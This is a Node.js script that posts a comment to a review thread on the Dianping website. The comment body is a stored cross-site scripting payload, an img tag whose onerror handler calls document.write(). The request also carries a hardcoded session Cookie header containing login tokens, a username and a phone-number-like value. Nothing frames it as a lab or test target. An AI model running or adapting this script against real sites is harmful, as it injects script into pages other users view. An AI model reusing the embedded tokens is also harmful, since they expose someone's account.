let http = require('http');

const urls = [
	'http://www.dianping.com/ajax/json/shop/reviewfollownote'
];

module.exports = () => {
	urls.map(it => {
		
		let req = http.request(it,{
			method:'POST',
			port:80,
			protocol:'http:',
			headers:{
				'Accept': 'application/json, text/javascript',
				'Accept-Encoding': 'gzip, deflate',
				'Accept-Language': 'zh-CN,zh;q=0.9',
				'Connection': 'keep-alive',
				'Content-Length': 135,
				'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8;',
				'Cookie': 'fspop=test; cy=8; cye=chengdu; _lxsdk_cuid=171820f2c3ac8-07de068ac881d1-39697506-1fa400-171820f2c3ac8; _lxsdk=171820f2c3ac8-07de068ac881d1-39697506-1fa400-171820f2c3ac8; _hc.v=6863e900-1cd3-332b-834b-beddfbe02680.1587024965; t_lxid=171820f2c81c8-0006001ba00789-39697506-1fa400-171820f2c81c8-tid; _dp.ac.v=60f288f4-c8d5-4187-97eb-3f81af88ce0c; dplet=ba7307de156d9e2157152a4e6f430376; dper=621fce7e1d8efe685634437e23b109d9e7da24ebbd030bd131ad9ca50e80bddb3fc7124dce80ea6e68c63c307c2f845c88a4cfd511f659aa573a058a5414eb690660a49a95ca167d6a30eea0e0cc3a49a41f49227c37be139152d10c603d5697; ll=7fd06e815b796be3df069dec7836c3df; ua=dpuser_9414989657; ctu=df1ca2f86012ac8afe1e788906d76dc9a19a696e61be4d444dd64dea2d0422e9; uamo=15756327635; s_ViewType=10; _lx_utm=utm_source%3DBaidu%26utm_medium%3Dorganic; _lxsdk_s=171820f2c3c-b76-c75-3ec%7C%7C747',
				'Host': 'www.dianping.com',
				'Origin': 'http://www.dianping.com',
				'Referer': 'http://www.dianping.com/member/1424739518/reviews',
				'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36',
				'X-Request': 'JSON',
				'X-Requested-With': 'XMLHttpRequest',
			}
		},(res) => {
			
			if(res.setEncoding){
				res.setEncoding('utf8');
			}
			
			if(res.on){
				res.on('data', (d) => {
					console.log(`${it}: ${d}`);
				});
			}
			
		})
		
		req.on('error',(r) => {
			console.log('--------error--------',r.message);
		})
		
		req.write(JSON.stringify({
			do:'add',
			mainnoteid:'705606209',
			notetype:11,
			grandpaID:0,
			notebody:'<img src="blank" onerror="document.write()"/>'
		}))
		
		req.end();
		
	})
}